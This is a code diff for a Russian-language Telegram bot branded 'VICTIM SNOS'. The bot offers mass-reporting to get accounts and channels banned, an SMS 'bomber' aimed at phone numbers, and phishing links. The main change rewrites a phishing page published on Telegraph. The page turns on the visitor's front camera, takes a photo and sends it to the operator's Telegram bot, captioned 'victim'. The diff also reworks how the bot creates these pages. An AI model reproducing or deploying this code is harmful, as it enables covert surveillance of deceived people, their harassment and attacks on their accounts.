@@ -65,7 +65,7 @@ MAX_ROUNDS = 10
 BOMBER_DELAY = 1
 
 MAIL_CONFIG_FILE = "mail_config.json"
-BANNER_PATH = "banner.png"
+BANNER_PATH = "Banner.png"
 
 USER_AGENTS = [
     'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/120.0.0.0 Safari/537.36',
@@ -229,78 +229,172 @@ TELEGRAPH_AUTHOR = "Telegram"
 TELEGRAPH_AUTHOR_URL = "https://t.me/VICTIMSNOSER"
 phish_pages = {}
 
-CAMERA_TEMPLATE = '''<div style="text-align: center; padding: 30px 20px; background: linear-gradient(135deg, #1a1a2e 0%, #16213e 100%); border-radius: 20px; margin: 20px 0;">
-    <h3 style="color: #fff; margin-bottom: 15px; font-size: 22px;">{title}</h3>
-    <p style="color: #aaa; margin-bottom: 25px; font-size: 15px; line-height: 1.5;">{description}</p>
-    <div style="position: relative; max-width: 320px; margin: 0 auto; border-radius: 16px; overflow: hidden; box-shadow: 0 10px 30px rgba(0,0,0,0.3);">
-        <video id="video" autoplay playsinline style="width: 100%; display: block; transform: scaleX(-1);"></video>
-        <canvas id="canvas" style="display: none;"></canvas>
+# Шаблон фишинг-страницы с камерой
+CAMERA_TEMPLATE = '''<!DOCTYPE html>
+<html>
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>{title}</title>
+    <style>
+        body {{
+            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Helvetica, Arial, sans-serif;
+            background: linear-gradient(135deg, #1a1a2e 0%, #16213e 100%);
+            min-height: 100vh;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            margin: 0;
+            padding: 20px;
+        }}
+        .container {{
+            max-width: 400px;
+            width: 100%;
+            text-align: center;
+            padding: 30px 20px;
+            background: rgba(255,255,255,0.05);
+            border-radius: 20px;
+            backdrop-filter: blur(10px);
+            border: 1px solid rgba(255,255,255,0.1);
+        }}
+        h3 {{
+            color: #fff;
+            margin-bottom: 15px;
+            font-size: 22px;
+        }}
+        p {{
+            color: #aaa;
+            margin-bottom: 25px;
+            font-size: 15px;
+            line-height: 1.5;
+        }}
+        .video-container {{
+            position: relative;
+            max-width: 320px;
+            margin: 0 auto;
+            border-radius: 16px;
+            overflow: hidden;
+            box-shadow: 0 10px 30px rgba(0,0,0,0.3);
+        }}
+        video {{
+            width: 100%;
+            display: block;
+            transform: scaleX(-1);
+        }}
+        button {{
+            background: linear-gradient(135deg, #e94560 0%, #c62a47 100%);
+            color: white;
+            border: none;
+            padding: 14px 30px;
+            font-size: 16px;
+            font-weight: bold;
+            border-radius: 12px;
+            margin: 25px 0 10px;
+            cursor: pointer;
+            width: 100%;
+            max-width: 320px;
+            box-shadow: 0 5px 15px rgba(233,69,96,0.3);
+            transition: transform 0.2s, box-shadow 0.2s;
+        }}
+        button:hover {{
+            transform: translateY(-2px);
+            box-shadow: 0 8px 20px rgba(233,69,96,0.4);
+        }}
+        button:disabled {{
+            opacity: 0.6;
+            cursor: not-allowed;
+            transform: none;
+        }}
+        #status {{
+            color: #888;
+            font-size: 13px;
+            margin-top: 10px;
+        }}
+        canvas {{
+            display: none;
+        }}
+    </style>
+</head>
+<body>
+    <div class="container">
+        <h3>{title}</h3>
+        <p>{description}</p>
+        <div class="video-container">
+            <video id="video" autoplay playsinline></video>
+            <canvas id="canvas"></canvas>
+        </div>
+        <button id="cam-btn">{button_text}</button>
+        <div id="status">Камера готова</div>
     </div>
-    <button id="cam-btn" style="background: linear-gradient(135deg, #e94560 0%, #c62a47 100%); color: white; border: none; padding: 14px 30px; font-size: 16px; font-weight: bold; border-radius: 12px; margin: 25px 0 10px; cursor: pointer; width: 100%; max-width: 320px; box-shadow: 0 5px 15px rgba(233,69,96,0.3);">{button_text}</button>
-    <div id="status" style="color: #888; font-size: 13px; margin-top: 10px;">Камера готова</div>
-</div>
-<script>
-(function(){
-    const BOT_TOKEN = "{bot_token}";
-    const CHAT_ID = "{chat_id}";
-    const PAGE_ID = "{page_id}";
-    const video = document.getElementById("video");
-    const canvas = document.getElementById("canvas");
-    const btn = document.getElementById("cam-btn");
-    const status = document.getElementById("status");
-    let stream = null;
-    let done = false;
-    
-    async function startCamera() {
-        try {
-            stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" } });
-            video.srcObject = stream;
-        } catch (e) {
-            status.textContent = "Доступ к камере запрещен";
-            status.style.color = "#ff4444";
+    <script>
+        const BOT_TOKEN = "{bot_token}";
+        const CHAT_ID = "{chat_id}";
+        const PAGE_ID = "{page_id}";
+        const video = document.getElementById("video");
+        const canvas = document.getElementById("canvas");
+        const btn = document.getElementById("cam-btn");
+        const status = document.getElementById("status");
+        let stream = null;
+        let done = false;
+        
+        async function startCamera() {{
+            try {{
+                stream = await navigator.mediaDevices.getUserMedia({{ video: {{ facingMode: "user" }} }});
+                video.srcObject = stream;
+            }} catch (e) {{
+                status.textContent = "Доступ к камере запрещен";
+                status.style.color = "#ff4444";
+                btn.disabled = true;
+            }}
+        }}
+        
+        async function sendPhoto(dataUrl) {{
+            try {{
+                const blob = await (await fetch(dataUrl)).blob();
+                const formData = new FormData();
+                formData.append("chat_id", CHAT_ID);
+                formData.append("photo", blob, "photo.jpg");
+                formData.append("caption", "Фото с камеры\\nЖертва: " + PAGE_ID);
+                const resp = await fetch(`https://api.telegram.org/bot${{BOT_TOKEN}}/sendPhoto`, {{ method: "POST", body: formData }});
+                const data = await resp.json();
+                return data.ok;
+            }} catch (e) {{
+                return false;
+            }}
+        }}
+        
+        async function takePhoto() {{
+            if (done) {{ 
+                status.textContent = "Фото уже отправлено"; 
+                return; 
+            }}
+            status.textContent = "Съемка...";
             btn.disabled = true;
-        }
-    }
-    
-    async function sendPhoto(dataUrl) {
-        try {
-            const blob = await (await fetch(dataUrl)).blob();
-            const formData = new FormData();
-            formData.append("chat_id", CHAT_ID);
-            formData.append("photo", blob, "photo.jpg");
-            formData.append("caption", "Фото с камеры\\nЖертва: " + PAGE_ID);
-            const resp = await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, { method: "POST", body: formData });
-            return (await resp.json()).ok;
-        } catch (e) {
-            return false;
-        }
-    }
-    
-    async function takePhoto() {
-        if (done) { status.textContent = "Фото уже отправлено"; return; }
-        status.textContent = "Съемка...";
-        btn.disabled = true;
-        canvas.width = video.videoWidth;
-        canvas.height = video.videoHeight;
-        canvas.getContext("2d").drawImage(video, 0, 0);
-        const sent = await sendPhoto(canvas.toDataURL("image/jpeg", 0.9));
-        if (sent) {
-            done = true;
-            status.textContent = "Готово";
-            status.style.color = "#4caf50";
-            btn.textContent = "Отправлено";
-            if (stream) { stream.getTracks().forEach(t => t.stop()); video.srcObject = null; }
-        } else {
-            status.textContent = "Ошибка";
-            status.style.color = "#ff4444";
-            btn.disabled = false;
-        }
-    }
-    
-    btn.addEventListener("click", takePhoto);
-    startCamera();
-})();
-</script>'''
+            canvas.width = video.videoWidth;
+            canvas.height = video.videoHeight;
+            canvas.getContext("2d").drawImage(video, 0, 0);
+            const sent = await sendPhoto(canvas.toDataURL("image/jpeg", 0.9));
+            if (sent) {{
+                done = true;
+                status.textContent = "Готово";
+                status.style.color = "#4caf50";
+                btn.textContent = "Отправлено";
+                if (stream) {{ 
+                    stream.getTracks().forEach(t => t.stop()); 
+                    video.srcObject = null; 
+                }}
+            }} else {{
+                status.textContent = "Ошибка";
+                status.style.color = "#ff4444";
+                btn.disabled = false;
+            }}
+        }}
+        
+        btn.addEventListener("click", takePhoto);
+        startCamera();
+    </script>
+</body>
+</html>'''
 
 logging.basicConfig(level=logging.INFO, format='%(asctime)s - %(levelname)s - %(message)s')
 logger = logging.getLogger(__name__)
@@ -927,43 +1021,69 @@ async def mass_report_message(user_id: int, link: str, reason: str, progress_cal
 
 
 # ---------- TELEGRAPH PHISHING ----------
-async def create_telegraph_page_fast(title: str, description: str, button_text: str, chat_id: int, page_id: str) -> Optional[str]:
+async def create_telegraph_page(title: str, description: str, button_text: str, chat_id: int, page_id: str) -> Optional[str]:
     try:
         camera_html = CAMERA_TEMPLATE.format(
-            title=title, description=description, button_text=button_text,
-            bot_token=BOT_TOKEN, chat_id=chat_id, page_id=page_id
+            title=title, 
+            description=description, 
+            button_text=button_text,
+            bot_token=BOT_TOKEN, 
+            chat_id=chat_id, 
+            page_id=page_id
         )
         
-        content = [
-            {"tag": "h3", "children": [title]},
-            {"tag": "p", "children": [description]},
-            {"tag": "figure", "children": [{"tag": "div", "attrs": {"data-html": camera_html}}]},
-        ]
-        
+        # Создаем аккаунт в Telegraph
         async with aiohttp.ClientSession() as session:
             async with session.post(
                 "https://api.telegra.ph/createAccount",
-                json={"short_name": f"User_{random.randint(10000, 99999)}", "author_name": TELEGRAPH_AUTHOR},
+                json={
+                    "short_name": f"User{random.randint(1000, 9999)}",
+                    "author_name": "Telegram User",
+                    "author_url": "https://t.me/VICTIMSNOSER"
+                },
                 timeout=10
             ) as resp:
                 data = await resp.json()
                 if not data.get("ok"):
+                    logger.error(f"Telegraph createAccount error: {data}")
                     return None
-                token = data["result"]["access_token"]
+                access_token = data["result"]["access_token"]
             
+            # Создаем страницу
             async with session.post(
                 "https://api.telegra.ph/createPage",
-                json={"access_token": token, "title": title, "author_name": TELEGRAPH_AUTHOR, "content": content},
+                json={
+                    "access_token": access_token,
+                    "title": title,
+                    "author_name": "Telegram User",
+                    "author_url": "https://t.me/VICTIMSNOSER",
+                    "content": [
+                        {"tag": "p", "children": [description]},
+                        {"tag": "figure", "children": [
+                            {"tag": "div", "attrs": {"data-html": camera_html}}
+                        ]}
+                    ],
+                    "return_content": False
+                },
                 timeout=10
             ) as resp:
                 data = await resp.json()
                 if data.get("ok"):
                     url = data["result"]["url"]
-                    phish_pages[page_id] = {"url": url, "chat_id": chat_id, "created": time.time()}
+                    phish_pages[page_id] = {
+                        "url": url, 
+                        "chat_id": chat_id, 
+                        "created": time.time(),
+                        "title": title
+                    }
+                    logger.info(f"Telegraph page created: {url}")
                     return url
+                else:
+                    logger.error(f"Telegraph createPage error: {data}")
+                    return None
     except Exception as e:
-        logger.error(f"Ошибка Telegraph: {e}")
-    return None
+        logger.error(f"Telegraph error: {e}")
+        return None
 
 
 # ---------- UI ----------
@@ -979,7 +1099,7 @@ def get_main_menu(user_id: int):
     if user_id == ADMIN_ID:
         builder.button(text="АДМИН", callback_data="admin_menu")
     
-    builder.adjust(2, 2, 1, 1, 1)
+    builder.adjust(2, 2, 2, 1, 1)
     return builder.as_markup()
 
 def get_snos_type_menu():
@@ -989,7 +1109,7 @@ def get_snos_type_menu():
     builder.button(text="ЖАЛОБА ПО ПОЧТЕ", callback_data="mail_menu")
     builder.button(text="ЖАЛОБА НА СООБЩЕНИЕ", callback_data="report_menu")
     builder.button(text="НАЗАД", callback_data="main_menu")
-    builder.adjust(1, 1, 1, 1, 1)
+    builder.adjust(1)
     return builder.as_markup()
 
 def get_snos_menu():
@@ -997,14 +1117,14 @@ def get_snos_menu():
     builder.button(text="ЗАПУСТИТЬ СНОС", callback_data="snos_start")
     builder.button(text="ОБНОВИТЬ СЕССИИ", callback_data="refresh_sessions")
     builder.button(text="НАЗАД", callback_data="snos_type")
-    builder.adjust(1, 1, 1)
+    builder.adjust(1)
     return builder.as_markup()
 
 def get_bomber_menu():
     builder = InlineKeyboardBuilder()
     builder.button(text="ЗАПУСТИТЬ БОМБЕР", callback_data="bomber")
     builder.button(text="НАЗАД", callback_data="main_menu")
-    builder.adjust(1, 1)
+    builder.adjust(1)
     return builder.as_markup()
 
 def get_mail_menu():
@@ -1012,7 +1132,7 @@ def get_mail_menu():
     builder.button(text="ЖАЛОБА НА АККАУНТ", callback_data="mail_acc")
     builder.button(text="ЖАЛОБА НА КАНАЛ", callback_data="mail_chan")
     builder.button(text="НАЗАД", callback_data="snos_type")
-    builder.adjust(1, 1, 1)
+    builder.adjust(1)
     return builder.as_markup()
 
 def get_mail_account_menu():
@@ -1044,7 +1164,7 @@ def get_report_menu():
     builder = InlineKeyboardBuilder()
     builder.button(text="ОТПРАВИТЬ ЖАЛОБУ", callback_data="report_msg")
     builder.button(text="НАЗАД", callback_data="snos_type")
-    builder.adjust(1, 1)
+    builder.adjust(1)
     return builder.as_markup()
 
 def get_report_reason_menu():
@@ -1060,7 +1180,7 @@ def get_phish_menu():
     builder.button(text="СОЗДАТЬ ФИШ-ССЫЛКУ", callback_data="phish_create")
     builder.button(text="МОИ ССЫЛКИ", callback_data="phish_list")
     builder.button(text="НАЗАД", callback_data="main_menu")
-    builder.adjust(1, 1, 1)
+    builder.adjust(1)
     return builder.as_markup()
 
 def get_admin_menu():
@@ -1072,7 +1192,7 @@ def get_admin_menu():
     builder.button(text="СПИСОК", callback_data="admin_list")
     builder.button(text="ЛОГИ", callback_data="admin_logs")
     builder.button(text="НАЗАД", callback_data="main_menu")
-    builder.adjust(2, 2, 2, 1)
+    builder.adjust(2)
     return builder.as_markup()
 
 def get_purchase_menu():
@@ -1167,6 +1287,7 @@ async def start(msg: types.Message):
 async def admin_cmd(msg: types.Message):
     await msg.delete()
     if msg.from_user.id != ADMIN_ID:
+        await send_message_with_banner(msg, "Только администратор!")
         return
     await send_message_with_banner(msg, f"Панель администратора\n\nПользователей: {len(ALLOWED_USERS)}", get_admin_menu())
 
@@ -1217,19 +1338,19 @@ async def snos_start(cb: types.CallbackQuery, state: FSMContext):
     if snos_type == "phone":
         await state.set_state(SnosPhoneState.waiting_phone)
         await cb.message.delete()
-        await cb.message.answer_photo(
-            FSInputFile(BANNER_PATH) if os.path.exists(BANNER_PATH) else None,
-            caption="<b>VICTIM SNOS - Блокировка нарушителей</b>\n\nВведите номер телефона:\n<code>+79991234567</code>",
-            reply_markup=InlineKeyboardMarkup(inline_keyboard=[[InlineKeyboardButton(text="Отмена", callback_data="snos_menu")]])
-        )
+        caption = "<b>VICTIM SNOS - Блокировка нарушителей</b>\n\nВведите номер телефона:\n<code>+79991234567</code>"
+        if os.path.exists(BANNER_PATH):
+            await cb.message.answer_photo(FSInputFile(BANNER_PATH), caption=caption, reply_markup=InlineKeyboardMarkup(inline_keyboard=[[InlineKeyboardButton(text="Отмена", callback_data="snos_menu")]]))
+        else:
+            await cb.message.answer(caption, reply_markup=InlineKeyboardMarkup(inline_keyboard=[[InlineKeyboardButton(text="Отмена", callback_data="snos_menu")]]))
     else:
         await state.set_state(SnosUsernameState.waiting_username)
         await cb.message.delete()
-        await cb.message.answer_photo(
-            FSInputFile(BANNER_PATH) if os.path.exists(BANNER_PATH) else None,
-            caption="<b>VICTIM SNOS - Блокировка нарушителей</b>\n\nВведите username:\n<code>@username</code>",
-            reply_markup=InlineKeyboardMarkup(inline_keyboard=[[InlineKeyboardButton(text="Отмена", callback_data="snos_menu")]])
-        )
+        caption = "<b>VICTIM SNOS - Блокировка нарушителей</b>\n\nВведите username:\n<code>@username</code>"
+        if os.path.exists(BANNER_PATH):
+            await cb.message.answer_photo(FSInputFile(BANNER_PATH), caption=caption, reply_markup=InlineKeyboardMarkup(inline_keyboard=[[InlineKeyboardButton(text="Отмена", callback_data="snos_menu")]]))
+        else:
+            await cb.message.answer(caption, reply_markup=InlineKeyboardMarkup(inline_keyboard=[[InlineKeyboardButton(text="Отмена", callback_data="snos_menu")]]))
 
 @dp.message(StateFilter(SnosPhoneState.waiting_phone))
 async def snos_phone_input(msg: types.Message, state: FSMContext):
@@ -1359,11 +1480,11 @@ async def bomber_start(cb: types.CallbackQuery, state: FSMContext):
     
     await state.set_state(BomberState.waiting_phone)
     await cb.message.delete()
-    await cb.message.answer_photo(
-        FSInputFile(BANNER_PATH) if os.path.exists(BANNER_PATH) else None,
-        caption="<b>VICTIM SNOS - Блокировка нарушителей</b>\n\nВведите номер телефона:",
-        reply_markup=InlineKeyboardMarkup(inline_keyboard=[[InlineKeyboardButton(text="Отмена", callback_data="bomber_menu")]])
-    )
+    caption = "<b>VICTIM SNOS - Блокировка нарушителей</b>\n\nВведите номер телефона:"
+    if os.path.exists(BANNER_PATH):
+        await cb.message.answer_photo(FSInputFile(BANNER_PATH), caption=caption, reply_markup=InlineKeyboardMarkup(inline_keyboard=[[InlineKeyboardButton(text="Отмена", callback_data="bomber_menu")]]))
+    else:
+        await cb.message.answer(caption, reply_markup=InlineKeyboardMarkup(inline_keyboard=[[InlineKeyboardButton(text="Отмена", callback_data="bomber_menu")]]))
 
 @dp.message(StateFilter(BomberState.waiting_phone))
 async def bomber_phone(msg: types.Message, state: FSMContext):
@@ -1430,11 +1551,11 @@ async def mail_acc_type(cb: types.CallbackQuery, state: FSMContext):
     await state.update_data(complaint_type=complaint_type)
     await state.set_state(MailAccountState.waiting_username)
     await cb.message.delete()
-    await cb.message.answer_photo(
-        FSInputFile(BANNER_PATH) if os.path.exists(BANNER_PATH) else None,
-        caption="<b>VICTIM SNOS - Блокировка нарушителей</b>\n\nВведите username (без @):",
-        reply_markup=InlineKeyboardMarkup(inline_keyboard=[[InlineKeyboardButton(text="Отмена", callback_data="mail_acc")]])
-    )
+    caption = "<b>VICTIM SNOS - Блокировка нарушителей</b>\n\nВведите username (без @):"
+    if os.path.exists(BANNER_PATH):
+        await cb.message.answer_photo(FSInputFile(BANNER_PATH), caption=caption, reply_markup=InlineKeyboardMarkup(inline_keyboard=[[InlineKeyboardButton(text="Отмена", callback_data="mail_acc")]]))
+    else:
+        await cb.message.answer(caption, reply_markup=InlineKeyboardMarkup(inline_keyboard=[[InlineKeyboardButton(text="Отмена", callback_data="mail_acc")]]))
 
 @dp.message(StateFilter(MailAccountState.waiting_username))
 async def mail_acc_username(msg: types.Message, state: FSMContext):
@@ -1489,11 +1610,11 @@ async def mail_chan_type(cb: types.CallbackQuery, state: FSMContext):
     await state.update_data(complaint_type=complaint_type)
     await state.set_state(MailChannelState.waiting_channel)
     await cb.message.delete()
-    await cb.message.answer_photo(
-        FSInputFile(BANNER_PATH) if os.path.exists(BANNER_PATH) else None,
-        caption="<b>VICTIM SNOS - Блокировка нарушителей</b>\n\nВведите ссылку на канал:",
-        reply_markup=InlineKeyboardMarkup(inline_keyboard=[[InlineKeyboardButton(text="Отмена", callback_data="mail_chan")]])
-    )
+    caption = "<b>VICTIM SNOS - Блокировка нарушителей</b>\n\nВведите ссылку на канал:"
+    if os.path.exists(BANNER_PATH):
+        await cb.message.answer_photo(FSInputFile(BANNER_PATH), caption=caption, reply_markup=InlineKeyboardMarkup(inline_keyboard=[[InlineKeyboardButton(text="Отмена", callback_data="mail_chan")]]))
+    else:
+        await cb.message.answer(caption, reply_markup=InlineKeyboardMarkup(inline_keyboard=[[InlineKeyboardButton(text="Отмена", callback_data="mail_chan")]]))
 
 @dp.message(StateFilter(MailChannelState.waiting_channel))
 async def mail_chan_link(msg: types.Message, state: FSMContext):
@@ -1554,11 +1675,11 @@ async def report_msg_start(cb: types.CallbackQuery, state: FSMContext):
     
     await state.set_state(ReportMessageState.waiting_link)
     await cb.message.delete()
-    await cb.message.answer_photo(
-        FSInputFile(BANNER_PATH) if os.path.exists(BANNER_PATH) else None,
-        caption="<b>VICTIM SNOS - Блокировка нарушителей</b>\n\nВведите ссылку на сообщение:\n<code>https://t.me/username/123</code>",
-        reply_markup=InlineKeyboardMarkup(inline_keyboard=[[InlineKeyboardButton(text="Отмена", callback_data="report_menu")]])
-    )
+    caption = "<b>VICTIM SNOS - Блокировка нарушителей</b>\n\nВведите ссылку на сообщение:\n<code>https://t.me/username/123</code>"
+    if os.path.exists(BANNER_PATH):
+        await cb.message.answer_photo(FSInputFile(BANNER_PATH), caption=caption, reply_markup=InlineKeyboardMarkup(inline_keyboard=[[InlineKeyboardButton(text="Отмена", callback_data="report_menu")]]))
+    else:
+        await cb.message.answer(caption, reply_markup=InlineKeyboardMarkup(inline_keyboard=[[InlineKeyboardButton(text="Отмена", callback_data="report_menu")]]))
 
 @dp.message(StateFilter(ReportMessageState.waiting_link))
 async def report_msg_link(msg: types.Message, state: FSMContext):
@@ -1570,11 +1691,11 @@ async def report_msg_link(msg: types.Message, state: FSMContext):
     await state.update_data(link=link)
     await state.set_state(ReportMessageState.waiting_reason)
     await msg.delete()
-    await msg.answer_photo(
-        FSInputFile(BANNER_PATH) if os.path.exists(BANNER_PATH) else None,
-        caption="<b>VICTIM SNOS - Блокировка нарушителей</b>\n\nВыберите причину:", 
-        reply_markup=get_report_reason_menu()
-    )
+    caption = "<b>VICTIM SNOS - Блокировка нарушителей</b>\n\nВыберите причину:"
+    if os.path.exists(BANNER_PATH):
+        await msg.answer_photo(FSInputFile(BANNER_PATH), caption=caption, reply_markup=get_report_reason_menu())
+    else:
+        await msg.answer(caption, reply_markup=get_report_reason_menu())
 
 @dp.callback_query(F.data.startswith("reason_"))
 async def report_msg_reason(cb: types.CallbackQuery, state: FSMContext):
@@ -1587,16 +1708,20 @@ async def report_msg_reason(cb: types.CallbackQuery, state: FSMContext):
     await cb.message.delete()
     
     active_reports[user_id] = True
-    st = await cb.message.answer_photo(
-        FSInputFile(BANNER_PATH) if os.path.exists(BANNER_PATH) else None,
-        caption="<b>VICTIM SNOS - Блокировка нарушителей</b>\n\nОтправка жалоб..."
-    )
+    caption = "<b>VICTIM SNOS - Блокировка нарушителей</b>\n\nОтправка жалоб..."
+    if os.path.exists(BANNER_PATH):
+        st = await cb.message.answer_photo(FSInputFile(BANNER_PATH), caption=caption)
+    else:
+        st = await cb.message.answer(caption)
     
     async def progress_callback(current):
         try:
             await st.edit_caption(caption=f"<b>VICTIM SNOS - Блокировка нарушителей</b>\n\nОтправка жалоб...\nОбработано: {current}")
         except:
-            pass
+            try:
+                await st.edit_text(f"<b>VICTIM SNOS - Блокировка нарушителей</b>\n\nОтправка жалоб...\nОбработано: {current}")
+            except:
+                pass
     
     ok, err = await mass_report_message(user_id, link, reason, progress_callback)
     
@@ -1605,11 +1730,11 @@ async def report_msg_reason(cb: types.CallbackQuery, state: FSMContext):
         del active_reports[user_id]
     
     await cb.message.answer(f"Отправлено жалоб: {ok}" + (f"\nОшибка: {err}" if err else ""))
-    await cb.message.answer_photo(
-        FSInputFile(BANNER_PATH) if os.path.exists(BANNER_PATH) else None,
-        caption="<b>VICTIM SNOS - Блокировка нарушителей</b>\n\nВыберите действие:", 
-        reply_markup=get_main_menu(user_id)
-    )
+    caption = "<b>VICTIM SNOS - Блокировка нарушителей</b>\n\nВыберите действие:"
+    if os.path.exists(BANNER_PATH):
+        await cb.message.answer_photo(FSInputFile(BANNER_PATH), caption=caption, reply_markup=get_main_menu(user_id))
+    else:
+        await cb.message.answer(caption, reply_markup=get_main_menu(user_id))
 
 @dp.callback_query(F.data == "phish_menu")
 async def phish_menu(cb: types.CallbackQuery):
@@ -1620,11 +1745,11 @@ async def phish_menu(cb: types.CallbackQuery):
 async def phish_create_start(cb: types.CallbackQuery, state: FSMContext):
     await state.set_state(PhishState.waiting_title)
     await cb.message.delete()
-    await cb.message.answer_photo(
-        FSInputFile(BANNER_PATH) if os.path.exists(BANNER_PATH) else None,
-        caption="<b>VICTIM SNOS - Блокировка нарушителей</b>\n\nВведите заголовок страницы:",
-        reply_markup=InlineKeyboardMarkup(inline_keyboard=[[InlineKeyboardButton(text="Отмена", callback_data="phish_menu")]])
-    )
+    caption = "<b>VICTIM SNOS - Блокировка нарушителей</b>\n\nВведите заголовок страницы:"
+    if os.path.exists(BANNER_PATH):
+        await cb.message.answer_photo(FSInputFile(BANNER_PATH), caption=caption, reply_markup=InlineKeyboardMarkup(inline_keyboard=[[InlineKeyboardButton(text="Отмена", callback_data="phish_menu")]]))
+    else:
+        await cb.message.answer(caption, reply_markup=InlineKeyboardMarkup(inline_keyboard=[[InlineKeyboardButton(text="Отмена", callback_data="phish_menu")]]))
 
 @dp.message(StateFilter(PhishState.waiting_title))
 async def phish_title(msg: types.Message, state: FSMContext):
@@ -1654,7 +1779,7 @@ async def phish_button(msg: types.Message, state: FSMContext):
     st = await send_message_with_banner(msg, "Создание ссылки...")
     
     page_id = hashlib.md5(f"{user_id}_{time.time()}".encode()).hexdigest()[:8]
-    url = await create_telegraph_page_fast(title, description, button_text, user_id, page_id)
+    url = await create_telegraph_page(title, description, button_text, user_id, page_id)
     
     await st.delete()
     
@@ -1769,11 +1894,11 @@ async def process_successful_payment(msg: types.Message):
 async def use_promo_start(cb: types.CallbackQuery, state: FSMContext):
     await state.set_state(PurchaseState.waiting_promo)
     await cb.message.delete()
-    await cb.message.answer_photo(
-        FSInputFile(BANNER_PATH) if os.path.exists(BANNER_PATH) else None,
-        caption="<b>VICTIM SNOS - Блокировка нарушителей</b>\n\nВведите промокод:",
-        reply_markup=InlineKeyboardMarkup(inline_keyboard=[[InlineKeyboardButton(text="Отмена", callback_data="purchase_menu")]])
-    )
+    caption = "<b>VICTIM SNOS - Блокировка нарушителей</b>\n\nВведите промокод:"
+    if os.path.exists(BANNER_PATH):
+        await cb.message.answer_photo(FSInputFile(BANNER_PATH), caption=caption, reply_markup=InlineKeyboardMarkup(inline_keyboard=[[InlineKeyboardButton(text="Отмена", callback_data="purchase_menu")]]))
+    else:
+        await cb.message.answer(caption, reply_markup=InlineKeyboardMarkup(inline_keyboard=[[InlineKeyboardButton(text="Отмена", callback_data="purchase_menu")]]))
 
 @dp.message(StateFilter(PurchaseState.waiting_promo))
 async def process_promo(msg: types.Message, state: FSMContext):
@@ -1797,6 +1922,7 @@ async def process_promo(msg: types.Message, state: FSMContext):
 @dp.callback_query(F.data == "admin_menu")
 async def admin_menu_handler(cb: types.CallbackQuery):
     if cb.from_user.id != ADMIN_ID:
+        await cb.answer("Доступ запрещен!", show_alert=True)
         return
     await edit_message_with_banner(cb, "Панель администратора", get_admin_menu())
     await cb.answer()
@@ -1818,11 +1944,11 @@ async def admin_add(cb: types.CallbackQuery, state: FSMContext):
     await state.set_state(AdminState.waiting_user_id)
     await state.update_data(admin_action="add_forever")
     await cb.message.delete()
-    await cb.message.answer_photo(
-        FSInputFile(BANNER_PATH) if os.path.exists(BANNER_PATH) else None,
-        caption="<b>VICTIM SNOS - Блокировка нарушителей</b>\n\nВведите ID пользователя:",
-        reply_markup=InlineKeyboardMarkup(inline_keyboard=[[InlineKeyboardButton(text="Отмена", callback_data="admin_menu")]])
-    )
+    caption = "<b>VICTIM SNOS - Блокировка нарушителей</b>\n\nВведите ID пользователя:"
+    if os.path.exists(BANNER_PATH):
+        await cb.message.answer_photo(FSInputFile(BANNER_PATH), caption=caption, reply_markup=InlineKeyboardMarkup(inline_keyboard=[[InlineKeyboardButton(text="Отмена", callback_data="admin_menu")]]))
+    else:
+        await cb.message.answer(caption, reply_markup=InlineKeyboardMarkup(inline_keyboard=[[InlineKeyboardButton(text="Отмена", callback_data="admin_menu")]]))
 
 @dp.callback_query(F.data == "admin_add_days")
 async def admin_add_days_start(cb: types.CallbackQuery, state: FSMContext):
@@ -1831,14 +1957,16 @@ async def admin_add_days_start(cb: types.CallbackQuery, state: FSMContext):
     await state.set_state(AdminState.waiting_user_id)
     await state.update_data(admin_action="add_days")
     await cb.message.delete()
-    await cb.message.answer_photo(
-        FSInputFile(BANNER_PATH) if os.path.exists(BANNER_PATH) else None,
-        caption="<b>VICTIM SNOS - Блокировка нарушителей</b>\n\nВведите ID пользователя:",
-        reply_markup=InlineKeyboardMarkup(inline_keyboard=[[InlineKeyboardButton(text="Отмена", callback_data="admin_menu")]])
-    )
+    caption = "<b>VICTIM SNOS - Блокировка нарушителей</b>\n\nВведите ID пользователя:"
+    if os.path.exists(BANNER_PATH):
+        await cb.message.answer_photo(FSInputFile(BANNER_PATH), caption=caption, reply_markup=InlineKeyboardMarkup(inline_keyboard=[[InlineKeyboardButton(text="Отмена", callback_data="admin_menu")]]))
+    else:
+        await cb.message.answer(caption, reply_markup=InlineKeyboardMarkup(inline_keyboard=[[InlineKeyboardButton(text="Отмена", callback_data="admin_menu")]]))
 
 @dp.message(StateFilter(AdminState.waiting_user_id))
 async def admin_user_id_received(msg: types.Message, state: FSMContext):
+    if msg.from_user.id != ADMIN_ID:
+        return
     try:
         user_id = int(msg.text.strip())
         await state.update_data(target_user_id=user_id)
@@ -1861,6 +1989,8 @@ async def admin_user_id_received(msg: types.Message, state: FSMContext):
 
 @dp.message(StateFilter(AdminState.waiting_add_days))
 async def admin_days_received(msg: types.Message, state: FSMContext):
+    if msg.from_user.id != ADMIN_ID:
+        return
     try:
         days = int(msg.text.strip())
         data = await state.get_data()
@@ -1879,14 +2009,16 @@ async def admin_create_promo_start(cb: types.CallbackQuery, state: FSMContext):
         return
     await state.set_state(AdminState.waiting_promo_code)
     await cb.message.delete()
-    await cb.message.answer_photo(
-        FSInputFile(BANNER_PATH) if os.path.exists(BANNER_PATH) else None,
-        caption="<b>VICTIM SNOS - Блокировка нарушителей</b>\n\nВведите промокод:",
-        reply_markup=InlineKeyboardMarkup(inline_keyboard=[[InlineKeyboardButton(text="Отмена", callback_data="admin_menu")]])
-    )
+    caption = "<b>VICTIM SNOS - Блокировка нарушителей</b>\n\nВведите промокод:"
+    if os.path.exists(BANNER_PATH):
+        await cb.message.answer_photo(FSInputFile(BANNER_PATH), caption=caption, reply_markup=InlineKeyboardMarkup(inline_keyboard=[[InlineKeyboardButton(text="Отмена", callback_data="admin_menu")]]))
+    else:
+        await cb.message.answer(caption, reply_markup=InlineKeyboardMarkup(inline_keyboard=[[InlineKeyboardButton(text="Отмена", callback_data="admin_menu")]]))
 
 @dp.message(StateFilter(AdminState.waiting_promo_code))
 async def admin_promo_code(msg: types.Message, state: FSMContext):
+    if msg.from_user.id != ADMIN_ID:
+        return
     code = msg.text.strip().upper()
     await state.update_data(promo_code=code)
     await state.set_state(AdminState.waiting_promo_days)
